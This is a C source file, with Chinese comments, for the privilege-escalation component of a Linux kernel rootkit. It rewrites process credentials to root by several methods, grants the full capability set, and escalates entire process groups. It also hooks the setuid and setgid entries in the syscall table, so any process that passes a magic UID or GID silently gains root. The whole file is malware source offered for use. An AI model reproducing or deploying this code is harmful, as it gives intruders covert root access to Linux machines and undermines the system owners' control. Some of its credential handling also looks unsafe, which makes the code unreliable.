/*
 * Privilege Escalation Implementation
 * Advanced techniques for elevating process privileges
 */

#include "rootkit.h"
#include <linux/capability.h>
#include <linux/security.h>
#define ROOT_UID 0
#define ROOT_GID 0

// 提权方法枚举
enum escalation_method {
    ESCALATION_DIRECT,      // 直接修改cred结构
    ESCALATION_COMMIT,      // 使用commit_creds
    ESCALATION_OVERRIDE,    // 覆盖安全检查
    ESCALATION_CAPABILITY,  // 添加所有capabilities
    ESCALATION_SETUID       // Hook setuid系统调用
};

// 提权统计信息
struct escalation_stats {
    unsigned long direct_count;
    unsigned long commit_count;
    unsigned long override_count;
    unsigned long capability_count;
    unsigned long setuid_count;
    unsigned long total_count;
};

static struct escalation_stats stats = {0};

// 原始系统调用指针
static asmlinkage long (*original_setuid)(const struct pt_regs *);
static asmlinkage long (*original_setgid)(const struct pt_regs *);
static asmlinkage long (*original_setreuid)(const struct pt_regs *);
static asmlinkage long (*original_setregid)(const struct pt_regs *);

// 外部变量
extern unsigned long *sys_call_table;
extern void disable_write_protection(void);
extern void enable_write_protection(void);

// 函数声明
static int grant_root_direct(struct task_struct *task);
static int grant_root_commit(struct task_struct *task);
static int grant_root_override(struct task_struct *task);
static int grant_root_capability(struct task_struct *task);
static int is_magic_process(struct task_struct *task);
static void log_escalation(struct task_struct *task, enum escalation_method method);

// 检查是否为魔术进程（特殊标识的进程）
static int is_magic_process(struct task_struct *task) {
    const struct cred *cred;
    
    if (!task) {
        return 0;
    }
    
    cred = __task_cred(task);
    if (!cred) {
        return 0;
    }
    
    // 检查是否有魔术UID/GID
    if (uid_eq(cred->uid, KUIDT_INIT(MAGIC_UID)) ||
        gid_eq(cred->gid, KGIDT_INIT(MAGIC_GID))) {
        return 1;
    }
    
    return 0;
}

// 记录提权操作
static void log_escalation(struct task_struct *task, enum escalation_method method) {
    const char *method_names[] = {
        "DIRECT", "COMMIT", "OVERRIDE", "CAPABILITY", "SETUID"
    };
    
    stats.total_count++;
    
    switch (method) {
        case ESCALATION_DIRECT:
            stats.direct_count++;
            break;
        case ESCALATION_COMMIT:
            stats.commit_count++;
            break;
        case ESCALATION_OVERRIDE:
            stats.override_count++;
            break;
        case ESCALATION_CAPABILITY:
            stats.capability_count++;
            break;
        case ESCALATION_SETUID:
            stats.setuid_count++;
            break;
    }
    
    printk(KERN_INFO "[rootkit] Privilege escalation: PID=%d, COMM=%s, METHOD=%s\n",
           task->pid, task->comm, method_names[method]);
}

// 方法1: 直接修改cred结构
static int grant_root_direct(struct task_struct *task) {
    struct cred *new_cred;
    
    if (!task) {
        task = current;
    }
    
    // 获取当前凭证的可写副本
    new_cred = (struct cred *)__task_cred(task);
    if (!new_cred) {
        return -1;
    }
    
    // 直接修改UID/GID
    new_cred->uid.val = ROOT_UID;
    new_cred->gid.val = ROOT_GID;
    new_cred->euid.val = ROOT_UID;
    new_cred->egid.val = ROOT_GID;
    new_cred->suid.val = ROOT_UID;
    new_cred->sgid.val = ROOT_GID;
    new_cred->fsuid.val = ROOT_UID;
    new_cred->fsgid.val = ROOT_GID;
    
    log_escalation(task, ESCALATION_DIRECT);
    return 0;
}

// 方法2: 使用commit_creds（推荐方法）
static int grant_root_commit(struct task_struct *task) {
    struct cred *new_cred;
    
    if (!task) {
        task = current;
    }
    
    // 准备新的凭证
    new_cred = prepare_creds();
    if (!new_cred) {
        return -ENOMEM;
    }
    
    // 设置root权限
    new_cred->uid.val = ROOT_UID;
    new_cred->gid.val = ROOT_GID;
    new_cred->euid.val = ROOT_UID;
    new_cred->egid.val = ROOT_GID;
    new_cred->suid.val = ROOT_UID;
    new_cred->sgid.val = ROOT_GID;
    new_cred->fsuid.val = ROOT_UID;
    new_cred->fsgid.val = ROOT_GID;
    
    // 提交新凭证
    commit_creds(new_cred);
    
    log_escalation(task, ESCALATION_COMMIT);
    return 0;
}

// 方法3: 覆盖安全检查
static int grant_root_override(struct task_struct *task) {
    struct cred *cred;
    
    if (!task) {
        task = current;
    }
    
    // 获取当前凭证
    cred = (struct cred *)__task_cred(task);
    if (!cred) {
        return -1;
    }
    
    // 绕过RCU保护直接修改
    rcu_read_lock();
    
    // 修改所有相关字段
    ((struct cred *)cred)->uid.val = ROOT_UID;
    ((struct cred *)cred)->gid.val = ROOT_GID;
    ((struct cred *)cred)->euid.val = ROOT_UID;
    ((struct cred *)cred)->egid.val = ROOT_GID;
    ((struct cred *)cred)->suid.val = ROOT_UID;
    ((struct cred *)cred)->sgid.val = ROOT_GID;
    ((struct cred *)cred)->fsuid.val = ROOT_UID;
    ((struct cred *)cred)->fsgid.val = ROOT_GID;
    
    rcu_read_unlock();
    
    log_escalation(task, ESCALATION_OVERRIDE);
    return 0;
}

// 方法4: 添加所有capabilities
static int grant_root_capability(struct task_struct *task) {
    struct cred *new_cred;
    
    if (!task) {
        task = current;
    }
    
    new_cred = prepare_creds();
    if (!new_cred) {
        return -ENOMEM;
    }
    
    // 设置root权限
    new_cred->uid.val = ROOT_UID;
    new_cred->gid.val = ROOT_GID;
    new_cred->euid.val = ROOT_UID;
    new_cred->egid.val = ROOT_GID;
    new_cred->suid.val = ROOT_UID;
    new_cred->sgid.val = ROOT_GID;
    new_cred->fsuid.val = ROOT_UID;
    new_cred->fsgid.val = ROOT_GID;
    
    // 添加所有capabilities
    cap_raise(new_cred->cap_effective, CAP_SYS_ADMIN);
    cap_raise(new_cred->cap_permitted, CAP_SYS_ADMIN);
    cap_raise(new_cred->cap_inheritable, CAP_SYS_ADMIN);
    
    // 设置完整的capability集合
    new_cred->cap_effective = CAP_FULL_SET;
    new_cred->cap_permitted = CAP_FULL_SET;
    new_cred->cap_inheritable = CAP_FULL_SET;
    
    commit_creds(new_cred);
    
    log_escalation(task, ESCALATION_CAPABILITY);
    return 0;
}

// Hook setuid系统调用
static asmlinkage long hooked_setuid(const struct pt_regs *regs) {
    uid_t uid = (uid_t)regs->di;
    
    // 如果尝试设置为魔术UID，则提权为root
    if (uid == MAGIC_UID) {
        grant_root_commit(current);
        log_escalation(current, ESCALATION_SETUID);
        return 0; // 返回成功
    }
    
    // 否则调用原始系统调用
    return original_setuid(regs);
}

// Hook setgid系统调用
static asmlinkage long hooked_setgid(const struct pt_regs *regs) {
    gid_t gid = (gid_t)regs->di;
    
    // 如果尝试设置为魔术GID，则提权为root
    if (gid == MAGIC_GID) {
        grant_root_commit(current);
        log_escalation(current, ESCALATION_SETUID);
        return 0; // 返回成功
    }
    
    // 否则调用原始系统调用
    return original_setgid(regs);
}

// 主要提权接口
int escalate_privileges(pid_t pid, enum escalation_method method) {
    struct task_struct *task;
    int result = -1;
    
    // 如果pid为0，使用当前进程
    if (pid == 0) {
        task = current;
    } else {
        // 查找指定PID的进程
        rcu_read_lock();
        task = pid_task(find_vpid(pid), PIDTYPE_PID);
        if (!task) {
            rcu_read_unlock();
            return -ESRCH;
        }
        get_task_struct(task);
        rcu_read_unlock();
    }
    
    // 根据方法执行提权
    switch (method) {
        case ESCALATION_DIRECT:
            result = grant_root_direct(task);
            break;
        case ESCALATION_COMMIT:
            result = grant_root_commit(task);
            break;
        case ESCALATION_OVERRIDE:
            result = grant_root_override(task);
            break;
        case ESCALATION_CAPABILITY:
            result = grant_root_capability(task);
            break;
        default:
            result = grant_root_commit(task); // 默认使用commit方法
            break;
    }
    
    // 释放任务结构引用
    if (pid != 0) {
        put_task_struct(task);
    }
    
    return result;
}

// 批量提权（提权指定进程组）
int escalate_process_group(pid_t pgid) {
    struct task_struct *task;
    struct pid *pid_struct;
    int count = 0;
    
    rcu_read_lock();
    
    pid_struct = find_vpid(pgid);
    if (!pid_struct) {
        rcu_read_unlock();
        return -ESRCH;
    }
    
    // 遍历进程组中的所有进程
    do_each_pid_task(pid_struct, PIDTYPE_PGID, task) {
        if (escalate_privileges(task->pid, ESCALATION_COMMIT) == 0) {
            count++;
        }
    } while_each_pid_task(pid_struct, PIDTYPE_PGID, task);
    
    rcu_read_unlock();
    
    printk(KERN_INFO "[rootkit] Escalated %d processes in group %d\n", count, pgid);
    return count;
}

// 获取提权统计信息
void get_escalation_stats(char *buffer, size_t size) {
    snprintf(buffer, size,
        "Privilege Escalation Statistics:\n"
        "Direct Method: %lu\n"
        "Commit Method: %lu\n"
        "Override Method: %lu\n"
        "Capability Method: %lu\n"
        "Setuid Hook: %lu\n"
        "Total Escalations: %lu\n",
        stats.direct_count,
        stats.commit_count,
        stats.override_count,
        stats.capability_count,
        stats.setuid_count,
        stats.total_count
    );
}

// 初始化提权子系统
int init_privilege_escalation(void) {
    if (!sys_call_table) {
        printk(KERN_ERR "[rootkit] System call table not available\n");
        return -1;
    }
    
    // 保存原始系统调用
    original_setuid = (void *)sys_call_table[__NR_setuid];
    original_setgid = (void *)sys_call_table[__NR_setgid];
    
    // Hook系统调用
    disable_write_protection();
    sys_call_table[__NR_setuid] = (unsigned long)hooked_setuid;
    sys_call_table[__NR_setgid] = (unsigned long)hooked_setgid;
    enable_write_protection();
    
    printk(KERN_INFO "[rootkit] Privilege escalation subsystem initialized\n");
    printk(KERN_INFO "[rootkit] Magic UID/GID: %d/%d\n", MAGIC_UID, MAGIC_GID);
    
    return 0;
}

// 清理提权子系统
void cleanup_privilege_escalation(void) {
    if (sys_call_table && original_setuid && original_setgid) {
        // 恢复原始系统调用
        disable_write_protection();
        sys_call_table[__NR_setuid] = (unsigned long)original_setuid;
        sys_call_table[__NR_setgid] = (unsigned long)original_setgid;
        enable_write_protection();
    }
    
    printk(KERN_INFO "[rootkit] Privilege escalation subsystem cleaned up\n");
    printk(KERN_INFO "[rootkit] Total escalations performed: %lu\n", stats.total_count);
}

// 导出符号
// Functions are part of the same module, no need to export